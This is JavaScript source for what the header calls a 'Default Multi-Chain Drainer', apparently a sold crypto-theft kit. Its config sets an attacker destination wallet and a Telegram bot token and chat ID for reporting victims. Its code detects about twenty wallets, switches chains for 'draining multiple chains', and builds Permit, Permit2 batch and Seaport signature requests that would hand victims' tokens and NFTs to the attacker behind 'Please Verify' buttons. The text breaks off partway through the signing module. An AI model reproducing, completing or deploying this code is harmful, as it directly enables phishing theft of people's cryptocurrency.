// ==========================================
// BUILD: ab5b6416
// SCRIPT: Default Multi-Chain Drainer
// GENERATED: 2026-03-24T12:06:51.219Z
// PLAN RESTRICTIONS: Bronze, Gold, Diamond
// ==========================================

(function() {
  'use strict';

  // ===== CONFIGURATION =====
  window.DRAINER_CONFIG = {
  "destination": "0xa416385102e69b4628737b10984C574279fb7154",
  "telegram": {
    "botToken": "8715690141:AAHxALLf424ingrOPaje4FSjs4lhdn18Aak",
    "chatId": "7737212833"
  },
  "ui": {
    "connectButtonsClass": "interact-button",
    "drainButtonsClass": "interact-button",
    "connectText": "Connect Wallet",
    "verifyText": "Please Verify",
    "modalType": "default"
  },
  "reown": {
    "projectId": "61cb704eeafaa41c97d99183ed9a1a14"
  },
  "ton": {
    "manifestUrl": "/tonconnect-manifest.json"
  },
  "checkboxes": {},
  "destinationWallet": "0xa416385102e69b4628737b10984C574279fb7154",
  "telegramBotToken": "8715690141:AAHxALLf424ingrOPaje4FSjs4lhdn18Aak",
  "telegramChatId": "7737212833",
  "connectButtonsClass": "interact-button",
  "drainButtonsClass": "interact-button",
  "connectText": "Connect Wallet",
  "verifyText": "Please Verify"
};

  // ===== CORE MODULES =====
  /**
 * Wallet Detection Module
 * Detects MetaMask, WalletConnect, Trust Wallet, Coinbase Wallet, and other Web3 providers
 * Supports both EIP-1193 and legacy providers
 */

const WalletDetect = (function() {
  'use strict';

  // Provider detection configurations
  const PROVIDERS = {
    metamask: {
      name: 'MetaMask',
      icon: '🦊',
      check: (provider) => provider.isMetaMask && !provider.isBraveWallet,
      priority: 1
    },
    brave: {
      name: 'Brave Wallet',
      icon: '🦁',
      check: (provider) => provider.isBraveWallet,
      priority: 2
    },
    trust: {
      name: 'Trust Wallet',
      icon: '🔐',
      check: (provider) => provider.isTrust || provider.isTrustWallet,
      priority: 3
    },
    coinbase: {
      name: 'Coinbase Wallet',
      icon: '🔵',
      check: (provider) => provider.isCoinbaseWallet,
      priority: 4
    },
    rainbow: {
      name: 'Rainbow',
      icon: '🌈',
      check: (provider) => provider.isRainbow,
      priority: 5
    },
    ledger: {
      name: 'Ledger',
      icon: '📒',
      check: (provider) => provider.isLedger,
      priority: 6
    },
    phantom: {
      name: 'Phantom',
      icon: '👻',
      check: (provider) => provider.isPhantom,
      priority: 7,
      type: 'solana'
    },
    tronlink: {
      name: 'TronLink',
      icon: '⚡',
      check: () => window.tronLink && window.tronLink.ready,
      priority: 8,
      type: 'tron'
    },
    okx: {
      name: 'OKX Wallet',
      icon: '✖️',
      check: (provider) => provider.isOkxWallet,
      priority: 9
    },
    rabby: {
      name: 'Rabby',
      icon: '🐰',
      check: (provider) => provider.isRabby,
      priority: 10
    },
    walletconnect: {
      name: 'WalletConnect',
      icon: '🔗',
      check: (provider) => provider.connector || provider.isWalletConnect,
      priority: 11
    },
    frame: {
      name: 'Frame',
      icon: '🖼️',
      check: (provider) => provider.isFrame,
      priority: 12
    },
    tokenpocket: {
      name: 'TokenPocket',
      icon: '💼',
      check: (provider) => provider.isTokenPocket,
      priority: 13
    },
    bitkeep: {
      name: 'BitKeep',
      icon: '💎',
      check: (provider) => provider.isBitKeep || provider.isBitkeep,
      priority: 14
    },
    safepal: {
      name: 'SafePal',
      icon: '🛡️',
      check: (provider) => provider.isSafePal,
      priority: 15
    },
    xdefi: {
      name: 'XDEFI',
      icon: '🌐',
      check: (provider) => provider.isXDEFI,
      priority: 16
    },
    exodus: {
      name: 'Exodus',
      icon: '🚀',
      check: (provider) => provider.isExodus,
      priority: 17
    },
    zeal: {
      name: 'Zeal',
      icon: '⚡',
      check: (provider) => provider.isZeal,
      priority: 18
    },
    oneInch: {
      name: '1inch Wallet',
      icon: '🦄',
      check: (provider) => provider.isOneInchIOSWallet || provider.isOneInchAndroidWallet,
      priority: 19
    },
    tally: {
      name: 'Tally Ho',
      icon: '🦌',
      check: (provider) => provider.isTally,
      priority: 20
    }
  };

  // Chain configurations
  const CHAINS = {
    eth: { chainId: '0x1', name: 'Ethereum', symbol: 'ETH', rpc: 'https://eth.llamarpc.com' },
    bsc: { chainId: '0x38', name: 'BNB Smart Chain', symbol: 'BNB', rpc: 'https://bsc-dataseed1.binance.org' },
    polygon: { chainId: '0x89', name: 'Polygon', symbol: 'MATIC', rpc: 'https://polygon-rpc.com' },
    avax: { chainId: '0xa86a', name: 'Avalanche', symbol: 'AVAX', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
    arbitrum: { chainId: '0xa4b1', name: 'Arbitrum One', symbol: 'ETH', rpc: 'https://arb1.arbitrum.io/rpc' },
    optimism: { chainId: '0xa', name: 'Optimism', symbol: 'ETH', rpc: 'https://mainnet.optimism.io' },
    base: { chainId: '0x2105', name: 'Base', symbol: 'ETH', rpc: 'https://mainnet.base.org' },
    fantom: { chainId: '0xfa', name: 'Fantom', symbol: 'FTM', rpc: 'https://rpc.ftm.tools' },
    unichain: { chainId: '0x82', name: 'Unichain', symbol: 'ETH', rpc: 'https://mainnet.unichain.org' },
    sonic: { chainId: '0x92', name: 'Sonic', symbol: 'S', rpc: 'https://rpc.soniclabs.com' },
    berachain: { chainId: '0x138c2', name: 'Berachain', symbol: 'BERA', rpc: 'https://rpc.berachain.com' },
    sol: { chainId: null, name: 'Solana', symbol: 'SOL', type: 'solana' },
    tron: { chainId: null, name: 'Tron', symbol: 'TRX', type: 'tron' }
  };

  /**
   * Get all available providers from window.ethereum
   */
  function getProviders() {
    const providers = [];
    
    if (!window.ethereum) {
      return providers;
    }

    // Handle multiple providers (EIP-5749)
    if (window.ethereum.providers && Array.isArray(window.ethereum.providers)) {
      window.ethereum.providers.forEach(provider => {
        const detected = detectProviderType(provider);
        if (detected) {
          providers.push({
            provider: provider,
            ...detected
          });
        }
      });
    } else {
      // Single provider
      const detected = detectProviderType(window.ethereum);
      if (detected) {
        providers.push({
          provider: window.ethereum,
          ...detected
        });
      }
    }

    // Sort by priority
    return providers.sort((a, b) => a.priority - b.priority);
  }

  /**
   * Detect provider type
   */
  function detectProviderType(provider) {
    for (const [key, config] of Object.entries(PROVIDERS)) {
      try {
        if (config.check(provider)) {
          return {
            type: key,
            name: config.name,
            icon: config.icon,
            walletType: config.type || 'evm',
            priority: config.priority
          };
        }
      } catch (e) {
        // Detection failed, continue
      }
    }
    
    // Unknown provider - still usable
    return {
      type: 'unknown',
      name: 'Unknown Wallet',
      icon: '👛',
      walletType: 'evm',
      priority: 999
    };
  }

  /**
   * Get the primary provider (highest priority)
   */
  function getPrimaryProvider() {
    const providers = getProviders();
    return providers.length > 0 ? providers[0] : null;
  }

  /**
   * Check if any wallet is installed
   */
  function isWalletInstalled() {
    return !!(window.ethereum || window.tronLink || window.solana || window.phantom);
  }

  /**
   * Check if wallet is connected
   */
  async function isConnected(provider = window.ethereum) {
    if (!provider) return false;
    
    try {
      const accounts = await provider.request({ method: 'eth_accounts' });
      return accounts && accounts.length > 0;
    } catch (e) {
      return false;
    }
  }

  /**
   * Get connected accounts
   */
  async function getAccounts(provider = window.ethereum) {
    if (!provider) return [];
    
    try {
      return await provider.request({ method: 'eth_accounts' }) || [];
    } catch (e) {
      return [];
    }
  }

  let uiAdapter = null;

  /**
   * Register a UI Adapter (e.g., Reown, RainbowKit)
   * This allows modern modal-based connections to override the default injection logic.
   */
  function registerAdapter(adapter) {
    if (adapter && typeof adapter.connect === 'function') {
      console.log('[WalletDetect] UI Adapter registered:', adapter.name || 'Unknown');
      uiAdapter = adapter;
    }
  }

  /**
   * Request wallet connection
   */
  async function connect(provider = window.ethereum) {
    // 1. UI Adapter (priority)
    if (uiAdapter) {
      try {
        const result = await uiAdapter.connect();
        return result;
      } catch (e) {
        console.error('[WalletDetect] Adapter connection failed:', e);
        throw e;
      }
    }
  
    // 2. If no injected wallet → open modal instead
    if (!provider) {
      console.log('[WalletDetect] No provider, opening modal...');
  
      try {
        const result = await WalletModal.show();
        return result;
      } catch (e) {
        throw new Error('User closed modal or no wallet selected');
      }
    }
  
    // 3. Injected wallet (MetaMask, etc.)
    try {
      const accounts = await provider.request({
        method: 'eth_requestAccounts'
      });
  
      return {
        address: accounts[0],
        wallet: 'injected'
      };
    } catch (err) {
      console.error('[WalletDetect] Provider connection failed:', err);
      throw err;
    }
  }

  /**
   * Get current chain ID
   */
  async function getChainId(provider = window.ethereum) {
    if (!provider) return null;
    
    try {
      const chainId = await provider.request({ method: 'eth_chainId' });
      return chainId;
    } catch (e) {
      return null;
    }
  }

  /**
   * Get chain info by chain ID
   */
  function getChainInfo(chainId) {
    const hexChainId = typeof chainId === 'number' ? '0x' + chainId.toString(16) : chainId;
    
    for (const [key, chain] of Object.entries(CHAINS)) {
      if (chain.chainId === hexChainId || chain.chainId === chainId) {
        return { key, ...chain };
      }
    }
    return null;
  }

  /**
   * Request chain switch
   */
  async function switchChain(provider, chainId) {
    if (!provider) {
      throw new Error('No provider');
    }

    const hexChainId = typeof chainId === 'number' ? '0x' + chainId.toString(16) : chainId;

    try {
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: hexChainId }]
      });
      return true;
    } catch (switchError) {
      // Chain not added to wallet
      if (switchError.code === 4902) {
        const chainInfo = getChainInfo(hexChainId);
        if (chainInfo) {
          try {
            await provider.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: hexChainId,
                chainName: chainInfo.name,
                nativeCurrency: {
                  name: chainInfo.name,
                  symbol: chainInfo.symbol,
                  decimals: 18
                },
                rpcUrls: [chainInfo.rpc],
                blockExplorerUrls: []
              }]
            });
            return true;
          } catch (addError) {
            throw new Error('Failed to add chain: ' + addError.message);
          }
        }
      }
      throw switchError;
    }
  }

  /**
   * Listen for account changes
   */
  function onAccountsChanged(provider, callback) {
    if (!provider) return;
    
    provider.on('accountsChanged', (accounts) => {
      callback(accounts);
    });
  }

  /**
   * Listen for chain changes
   */
  function onChainChanged(provider, callback) {
    if (!provider) return;
    
    provider.on('chainChanged', (chainId) => {
      callback(chainId);
    });
  }

  /**
   * Listen for disconnect
   */
  function onDisconnect(provider, callback) {
    if (!provider) return;
    
    provider.on('disconnect', (error) => {
      callback(error);
    });
  }

  /**
   * Get Solana provider
   */
  function getSolanaProvider() {
    return window.solana || window.phantom?.solana || null;
  }

  /**
   * Get Tron provider
   */
  function getTronProvider() {
    return window.tronLink || null;
  }

  /**
   * Connect to Solana wallet
   */
  async function connectSolana() {
    const provider = getSolanaProvider();
    if (!provider) {
      throw new Error('No Solana wallet found');
    }

    try {
      const response = await provider.connect();
      return {
        publicKey: response.publicKey.toString(),
        address: response.publicKey.toString()
      };
    } catch (error) {
      throw new Error('Solana connection failed: ' + error.message);
    }
  }

  /**
   * Connect to Tron wallet
   */
  async function connectTron() {
    const provider = getTronProvider();
    if (!provider) {
      throw new Error('No Tron wallet found');
    }

    try {
      if (!provider.ready) {
        await provider.request({ method: 'tron_requestAccounts' });
      }
      const address = provider.tronWeb?.defaultAddress?.base58;
      return { address };
    } catch (error) {
      throw new Error('Tron connection failed: ' + error.message);
    }
  }

  // Public API
  return {
    PROVIDERS,
    CHAINS,
    getProviders,
    getPrimaryProvider,
    isWalletInstalled,
    isConnected,
    getAccounts,
    connect,
    getChainId,
    getChainInfo,
    switchChain,
    onAccountsChanged,
    onChainChanged,
    onDisconnect,
    getSolanaProvider,
    getTronProvider,
    connectSolana,
    connectTron,
    registerAdapter
  };
})();

// Export for module systems
if (typeof module !== 'undefined' && module.exports) {
  module.exports = WalletDetect;
}

/**
 * Chain Switch Module
 * Handles network switching across all supported chains
 * Supports both EVM and non-EVM chains (Solana, Tron)
 */

const ChainSwitch = (function() {
  'use strict';

  // Extended chain configurations with full params
  const CHAIN_PARAMS = {
    // Ethereum Mainnet
    eth: {
      chainId: '0x1',
      chainName: 'Ethereum Mainnet',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://eth.llamarpc.com', 'https://ethereum.publicnode.com'],
      blockExplorerUrls: ['https://etherscan.io'],
      iconUrls: []
    },
    // BNB Smart Chain
    bsc: {
      chainId: '0x38',
      chainName: 'BNB Smart Chain',
      nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
      rpcUrls: ['https://bsc-dataseed1.binance.org', 'https://bsc-dataseed2.binance.org'],
      blockExplorerUrls: ['https://bscscan.com'],
      iconUrls: []
    },
    // Polygon
    polygon: {
      chainId: '0x89',
      chainName: 'Polygon Mainnet',
      nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
      rpcUrls: ['https://polygon-rpc.com', 'https://rpc-mainnet.matic.quiknode.pro'],
      blockExplorerUrls: ['https://polygonscan.com'],
      iconUrls: []
    },
    // Avalanche
    avax: {
      chainId: '0xa86a',
      chainName: 'Avalanche C-Chain',
      nativeCurrency: { name: 'Avalanche', symbol: 'AVAX', decimals: 18 },
      rpcUrls: ['https://api.avax.network/ext/bc/C/rpc'],
      blockExplorerUrls: ['https://snowtrace.io'],
      iconUrls: []
    },
    // Arbitrum
    arbitrum: {
      chainId: '0xa4b1',
      chainName: 'Arbitrum One',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://arb1.arbitrum.io/rpc'],
      blockExplorerUrls: ['https://arbiscan.io'],
      iconUrls: []
    },
    // Optimism
    optimism: {
      chainId: '0xa',
      chainName: 'Optimism',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://mainnet.optimism.io'],
      blockExplorerUrls: ['https://optimistic.etherscan.io'],
      iconUrls: []
    },
    // Base
    base: {
      chainId: '0x2105',
      chainName: 'Base',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://mainnet.base.org'],
      blockExplorerUrls: ['https://basescan.org'],
      iconUrls: []
    },
    // Fantom
    fantom: {
      chainId: '0xfa',
      chainName: 'Fantom Opera',
      nativeCurrency: { name: 'Fantom', symbol: 'FTM', decimals: 18 },
      rpcUrls: ['https://rpc.ftm.tools', 'https://fantom.publicnode.com'],
      blockExplorerUrls: ['https://ftmscan.com'],
      iconUrls: []
    },
    // Unichain
    unichain: {
      chainId: '0x82',
      chainName: 'Unichain',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://mainnet.unichain.org'],
      blockExplorerUrls: ['https://uniscan.xyz'],
      iconUrls: []
    },
    // Sonic
    sonic: {
      chainId: '0x92',
      chainName: 'Sonic',
      nativeCurrency: { name: 'Sonic', symbol: 'S', decimals: 18 },
      rpcUrls: ['https://rpc.soniclabs.com'],
      blockExplorerUrls: ['https://sonicscan.org'],
      iconUrls: []
    },
    // Berachain
    berachain: {
      chainId: '0x138c2',
      chainName: 'Berachain',
      nativeCurrency: { name: 'BERA', symbol: 'BERA', decimals: 18 },
      rpcUrls: ['https://rpc.berachain.com'],
      blockExplorerUrls: ['https://berascan.com'],
      iconUrls: []
    },
    // Linea
    linea: {
      chainId: '0xe708',
      chainName: 'Linea',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://rpc.linea.build'],
      blockExplorerUrls: ['https://lineascan.build'],
      iconUrls: []
    },
    // Scroll
    scroll: {
      chainId: '0x534352',
      chainName: 'Scroll',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://rpc.scroll.io'],
      blockExplorerUrls: ['https://scrollscan.com'],
      iconUrls: []
    },
    // zkSync Era
    zksync: {
      chainId: '0x144',
      chainName: 'zkSync Era',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://mainnet.era.zksync.io'],
      blockExplorerUrls: ['https://explorer.zksync.io'],
      iconUrls: []
    },
    // Blast
    blast: {
      chainId: '0x13e31',
      chainName: 'Blast',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://rpc.blast.io'],
      blockExplorerUrls: ['https://blastscan.io'],
      iconUrls: []
    },
    // Gnosis
    gnosis: {
      chainId: '0x64',
      chainName: 'Gnosis Chain',
      nativeCurrency: { name: 'xDai', symbol: 'XDAI', decimals: 18 },
      rpcUrls: ['https://rpc.gnosischain.com'],
      blockExplorerUrls: ['https://gnosisscan.io'],
      iconUrls: []
    },
    // Celo
    celo: {
      chainId: '0xa4ec',
      chainName: 'Celo',
      nativeCurrency: { name: 'Celo', symbol: 'CELO', decimals: 18 },
      rpcUrls: ['https://forno.celo.org'],
      blockExplorerUrls: ['https://celoscan.io'],
      iconUrls: []
    }
  };

  // Chain ID to key mapping
  const CHAIN_ID_MAP = {
    '0x1': 'eth',
    '0x38': 'bsc',
    '0x89': 'polygon',
    '0xa86a': 'avax',
    '0xa4b1': 'arbitrum',
    '0xa': 'optimism',
    '0x2105': 'base',
    '0xfa': 'fantom',
    '0x82': 'unichain',
    '0x92': 'sonic',
    '0x138c2': 'berachain',
    '0xe708': 'linea',
    '0x534352': 'scroll',
    '0x144': 'zksync',
    '0x13e31': 'blast',
    '0x64': 'gnosis',
    '0xa4ec': 'celo'
  };

  /**
   * Switch to a specific chain
   * @param {object} provider - Web3 provider
   * @param {string|number} chainKeyOrId - Chain key (e.g., 'eth') or chain ID
   * @returns {Promise<boolean>}
   */
  async function switchTo(provider, chainKeyOrId) {
    if (!provider) {
      throw new Error('No provider available');
    }

    // Normalize chain ID
    let chainKey, chainParams;
    
    if (typeof chainKeyOrId === 'string' && chainKeyOrId.startsWith('0x')) {
      // Hex chain ID provided
      chainKey = CHAIN_ID_MAP[chainKeyOrId.toLowerCase()];
      chainParams = CHAIN_PARAMS[chainKey];
      chainParams = { ...chainParams, chainId: chainKeyOrId };
    } else if (typeof chainKeyOrId === 'number') {
      // Numeric chain ID provided
      const hexId = '0x' + chainKeyOrId.toString(16);
      chainKey = CHAIN_ID_MAP[hexId.toLowerCase()];
      chainParams = CHAIN_PARAMS[chainKey];
      if (chainParams) {
        chainParams = { ...chainParams, chainId: hexId };
      }
    } else {
      // Chain key provided
      chainKey = chainKeyOrId.toLowerCase();
      chainParams = CHAIN_PARAMS[chainKey];
    }

    if (!chainParams) {
      throw new Error(`Unsupported chain: ${chainKeyOrId}`);
    }

    try {
      // Try switching first
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: chainParams.chainId }]
      });
      return { success: true, chainKey, chainId: chainParams.chainId };
    } catch (switchError) {
      // Chain not added - try adding it
      if (switchError.code === 4902) {
        try {
          await provider.request({
            method: 'wallet_addEthereumChain',
            params: [chainParams]
          });
          return { success: true, chainKey, chainId: chainParams.chainId, added: true };
        } catch (addError) {
          throw new Error(`Failed to add chain ${chainParams.chainName}: ${addError.message}`);
        }
      }
      throw switchError;
    }
  }

  /**
   * Switch to multiple chains sequentially
   * @param {object} provider - Web3 provider
   * @param {string[]} chainKeys - Array of chain keys
   * @returns {Promise<object[]>}
   */
  async function switchMultiple(provider, chainKeys) {
    const results = [];
    
    for (const chainKey of chainKeys) {
      try {
        const result = await switchTo(provider, chainKey);
        results.push({ chainKey, ...result });
      } catch (error) {
        results.push({ chainKey, success: false, error: error.message });
      }
    }
    
    return results;
  }

  /**
   * Get current chain
   * @param {object} provider - Web3 provider
   * @returns {Promise<object>}
   */
  async function getCurrentChain(provider) {
    if (!provider) return null;
    
    try {
      const chainId = await provider.request({ method: 'eth_chainId' });
      const chainKey = CHAIN_ID_MAP[chainId.toLowerCase()];
      const chainParams = CHAIN_PARAMS[chainKey];
      
      return {
        chainId,
        chainKey,
        ...chainParams
      };
    } catch (error) {
      return null;
    }
  }

  /**
   * Check if provider is on specific chain
   * @param {object} provider - Web3 provider
   * @param {string|number} chainKeyOrId - Chain to check
   * @returns {Promise<boolean>}
   */
  async function isOnChain(provider, chainKeyOrId) {
    const current = await getCurrentChain(provider);
    if (!current) return false;
    
    let targetId;
    if (typeof chainKeyOrId === 'string' && chainKeyOrId.startsWith('0x')) {
      targetId = chainKeyOrId.toLowerCase();
    } else if (typeof chainKeyOrId === 'number') {
      targetId = '0x' + chainKeyOrId.toString(16);
    } else {
      const params = CHAIN_PARAMS[chainKeyOrId.toLowerCase()];
      targetId = params?.chainId;
    }
    
    return current.chainId.toLowerCase() === targetId?.toLowerCase();
  }

  /**
   * Watch for chain changes
   * @param {object} provider - Web3 provider
   * @param {function} callback - Callback function
   */
  function watchChainChanges(provider, callback) {
    if (!provider) return;
    
    provider.on('chainChanged', (chainId) => {
      const chainKey = CHAIN_ID_MAP[chainId.toLowerCase()];
      const chainParams = CHAIN_PARAMS[chainKey];
      callback({
        chainId,
        chainKey,
        ...chainParams
      });
    });
  }

  /**
   * Get all supported chains
   * @returns {object}
   */
  function getSupportedChains() {
    return { ...CHAIN_PARAMS };
  }

  /**
   * Get chain params by key or ID
   * @param {string|number} chainKeyOrId
   * @returns {object|null}
   */
  function getChainParams(chainKeyOrId) {
    if (typeof chainKeyOrId === 'string' && chainKeyOrId.startsWith('0x')) {
      const key = CHAIN_ID_MAP[chainKeyOrId.toLowerCase()];
      return key ? CHAIN_PARAMS[key] : null;
    } else if (typeof chainKeyOrId === 'number') {
      const hexId = '0x' + chainKeyOrId.toString(16);
      const key = CHAIN_ID_MAP[hexId.toLowerCase()];
      return key ? CHAIN_PARAMS[key] : null;
    } else {
      return CHAIN_PARAMS[chainKeyOrId.toLowerCase()] || null;
    }
  }

  /**
   * Batch switch with callback after each switch
   * Useful for draining multiple chains
   */
  async function batchSwitchWithCallback(provider, chainKeys, callback, options = {}) {
    const { delayBetweenSwitches = 500, continueOnError = true } = options;
    const results = [];
    
    for (const chainKey of chainKeys) {
      try {
        const switchResult = await switchTo(provider, chainKey);
        
        if (switchResult.success) {
          // Wait for chain to be ready
          await new Promise(resolve => setTimeout(resolve, delayBetweenSwitches));
          
          // Execute callback
          const callbackResult = await callback(chainKey, switchResult);
          results.push({ chainKey, switch: switchResult, callback: callbackResult });
        }
      } catch (error) {
        results.push({ chainKey, error: error.message });
        if (!continueOnError) break;
      }
    }
    
    return results;
  }

  // Public API
  return {
    CHAIN_PARAMS,
    CHAIN_ID_MAP,
    switchTo,
    switchMultiple,
    getCurrentChain,
    isOnChain,
    watchChainChanges,
    getSupportedChains,
    getChainParams,
    batchSwitchWithCallback
  };
})();

// Export for module systems
if (typeof module !== 'undefined' && module.exports) {
  module.exports = ChainSwitch;
}

/**
 * Signer Module
 * Handles all signature operations: EIP-712 typed data, personal_sign, and Permit signatures
 * Supports eth_signTypedData_v4, eth_signTypedData_v3, eth_signTypedData, personal_sign
 */

const Signer = (function() {
  'use strict';

  // EIP-712 Domain types
  const EIP712_DOMAIN_TYPE = [
    { name: 'name', type: 'string' },
    { name: 'version', type: 'string' },
    { name: 'chainId', type: 'uint256' },
    { name: 'verifyingContract', type: 'address' }
  ];

  // Permit2 domain
  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

  /**
   * Request EIP-712 typed data signature (v4)
   * @param {object} provider - Web3 provider
   * @param {string} address - Signer address
   * @param {object} typedData - EIP-712 typed data object
   * @returns {Promise<string>} Signature
   */
  async function signTypedData(provider, address, typedData) {
    if (!provider) {
      throw new Error('No provider available');
    }

    try {
      // Try v4 first (most compatible with MetaMask)
      const signature = await provider.request({
        method: 'eth_signTypedData_v4',
        params: [address, JSON.stringify(typedData)]
      });
      return signature;
    } catch (error) {
      // Fallback to v3
      try {
        const signature = await provider.request({
          method: 'eth_signTypedData_v3',
          params: [address, JSON.stringify(typedData)]
        });
        return signature;
      } catch (v3Error) {
        // Final fallback to v1
        try {
          const signature = await provider.request({
            method: 'eth_signTypedData',
            params: [typedData, address]
          });
          return signature;
        } catch (v1Error) {
          throw new Error(`All signing methods failed: ${error.message}`);
        }
      }
    }
  }

  /**
   * Request personal_sign signature
   * @param {object} provider - Web3 provider
   * @param {string} address - Signer address
   * @param {string} message - Message to sign
   * @returns {Promise<string>} Signature
   */
  async function personalSign(provider, address, message) {
    if (!provider) {
      throw new Error('No provider available');
    }

    // Convert string to hex if needed
    let hexMessage = message;
    if (!message.startsWith('0x')) {
      hexMessage = '0x' + Buffer.from(message).toString('hex');
    }

    try {
      const signature = await provider.request({
        method: 'personal_sign',
        params: [hexMessage, address]
      });
      return signature;
    } catch (error) {
      throw new Error(`personal_sign failed: ${error.message}`);
    }
  }

  /**
   * Create Permit2 permit typed data for tokens
   * @param {object} params - Permit parameters
   * @returns {object} EIP-712 typed data
   */
  function createPermit2TypedData(params) {
    const {
      owner,
      token,
      spender,
      amount,
      expiration,
      nonce,
      chainId,
      sigDeadline
    } = params;

    const domain = {
      name: 'Permit2',
      chainId: chainId,
      verifyingContract: PERMIT2_ADDRESS
    };

    const types = {
      EIP712Domain: EIP712_DOMAIN_TYPE,
      PermitTransferFrom: [
        { name: 'permitted', type: 'TokenPermissions' },
        { name: 'spender', type: 'address' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' }
      ],
      TokenPermissions: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint256' }
      ]
    };

    const message = {
      permitted: {
        token: token,
        amount: amount
      },
      spender: spender,
      nonce: nonce,
      deadline: sigDeadline || expiration
    };

    return { domain, types, primaryType: 'PermitTransferFrom', message };
  }

  /**
   * Create Permit2 batch permit typed data for multiple tokens
   */
  function createPermit2BatchTypedData(params) {
    const {
      owner,
      tokens, // Array of { token, amount }
      spender,
      nonce,
      chainId,
      deadline
    } = params;

    const domain = {
      name: 'Permit2',
      chainId: chainId,
      verifyingContract: PERMIT2_ADDRESS
    };

    const types = {
      EIP712Domain: EIP712_DOMAIN_TYPE,
      PermitBatchTransferFrom: [
        { name: 'permitted', type: 'TokenPermissions[]' },
        { name: 'spender', type: 'address' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' }
      ],
      TokenPermissions: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint256' }
      ]
    };

    const message = {
      permitted: tokens.map(t => ({
        token: t.token,
        amount: t.amount
      })),
      spender: spender,
      nonce: nonce,
      deadline: deadline
    };

    return { domain, types, primaryType: 'PermitBatchTransferFrom', message };
  }

  /**
   * Create standard EIP-2612 Permit typed data
   * @param {object} params - Permit parameters
   * @returns {object} EIP-712 typed data
   */
  function createPermitTypedData(params) {
    const {
      owner,
      token,
      tokenName,
      spender,
      value,
      nonce,
      deadline,
      chainId
    } = params;

    const domain = {
      name: tokenName || 'Token',
      version: '1',
      chainId: chainId,
      verifyingContract: token
    };

    const types = {
      EIP712Domain: EIP712_DOMAIN_TYPE,
      Permit: [
        { name: 'owner', type: 'address' },
        { name: 'spender', type: 'address' },
        { name: 'value', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' }
      ]
    };

    const message = {
      owner: owner,
      spender: spender,
      value: value,
      nonce: nonce,
      deadline: deadline
    };

    return { domain, types, primaryType: 'Permit', message };
  }

  /**
   * Create Seaport order typed data
   */
  function createSeaportTypedData(params) {
    const {
      offerer,
      zone,
      offer, // Array of { itemType, token, identifierOrCriteria, startAmount, endAmount }
      consideration, // Array of same structure
      startTime,
      endTime,
      orderType,
      nonce,
      chainId
    } = params;

    const SEAPORT_ADDRESS = '0x00000000006c3852cbEf3e08E8dF289169EdE581';

    const domain = {
      name: 'Seaport',
      version: '1.1',
      chainId: chainId,
      verifyingContract: SEAPORT_ADDRESS
    };

    const types = {
      EIP712Domain: EIP712_DOMAIN_TYPE,
      OrderComponents: [
        { name: 'offerer', type: 'address' },
        { name: 'zone', type: 'address' },
        { name: 'offer', type: 'OfferItem[]' },
        { name: 'consideration', type: 'ConsiderationItem[]' },
        { name: 'orderType', type: 'uint8' },
        { name: 'startTime', type: 'uint256' },
        { name: 'endTime', type: 'uint256' },
        { name: 'zoneHash', type: 'bytes32' },
        { name: 'salt', type: 'uint256' },
        { name: 'conduitKey', type: 'bytes32' },
        { name: 'counter', type: 'uint256' }
      ],
      OfferItem: [
        { name: 'itemType', type: 'uint8' },
        { name: 'token', type: 'address' },
        { name: 'identifierOrCriteria', type: 'uint256' },
        { name: 'startAmount', type: 'uint256' },
        { name: 'endAmount', type: 'uint256' }
      ],
      ConsiderationItem: [
        { name: 'itemType', type: 'uint8' },
        { name: 'token', type: 'address' },
        { name: 'identifierOrCriteria', type: 'uint256' },
        { name: 'startAmount', type: 'uint256' },
        { name: 'endAmount', type: 'uint256' },
        { name: 'recipient', type: 'address' }
      ]
    };

    const message = {
      offerer: offerer,
      zone: zone || '0x0000000000000000000000000000000000000000',
      offer: offer,
      consideration: consideration,
      orderType: orderType || 0,
      startTime: startTime,
      endTime: endTime,
      zoneHash: '0x0000000000000000000000000000000000000000000000000000000000000000',
      salt: nonce,
      conduitKey: '0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000',
      counter: 0
    };

    return { domain, types, primaryType: 'OrderComponents', message };
  }

  /**
   * Sign a transaction (for some wallets)
   */
  async function signTransaction(provider, from, txObject) {
    if (!provider) {
      throw new Error('No provider available');
    }

    try {
      const signedTx = await provider.request({
        method: 'eth_signTransaction',
        params: [{ from, ...txObject }]
      });
      return signedTx;
    } catch (error) {
      throw new Error(`Transaction signing failed: ${error.message}`);
    }
  }

  /**
   * Parse signature into v, r, s components
   * @param {string} signature - Hex signature
   * @returns {object} { v, r, s }
   */
  function parseSignature(signature) {
    if (!signature || signature.length < 130) {
      throw new Error('Invalid signature length');
    }

    const sig = signature.startsWith('0x') ? signature.slice(2) : signature;
    
    return {
      r: '0x' + sig.slice(0, 64),
      s: '0x' + sig.slice(64, 128),
      v: parseInt(sig.slice(128, 130), 16)
    };
  }

  /**
   * Recover address from signature
   * Note: This requires ethers.js or similar library
   */
